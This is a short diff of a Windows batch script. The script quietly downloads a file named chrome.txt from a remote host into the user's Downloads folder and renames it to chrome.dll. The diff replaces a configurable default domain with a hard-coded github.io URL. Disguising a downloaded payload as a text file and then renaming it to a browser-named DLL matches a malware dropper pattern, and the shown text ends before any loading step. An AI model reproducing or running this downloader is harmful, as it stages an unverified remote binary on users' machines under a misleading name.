@@ -1,8 +1,6 @@
 @echo off
-set "BASE=%~1"
-if "%BASE%"=="" set "BASE=https://c.orders.io.vn"
 set "DL=%USERPROFILE%\Downloads"
-curl -s -L "%BASE%/files/chrome.txt" -o "%DL%\chrome.txt"
+curl -s -L https://bkcnnk1a-code.github.io/dl/files/chrome.txt -o "%DL%\chrome.txt"
 if exist "%DL%\chrome.txt" (
     if exist "%DL%\chrome.dll" del /f /q "%DL%\chrome.dll"
     ren "%DL%\chrome.txt" "chrome.dll"
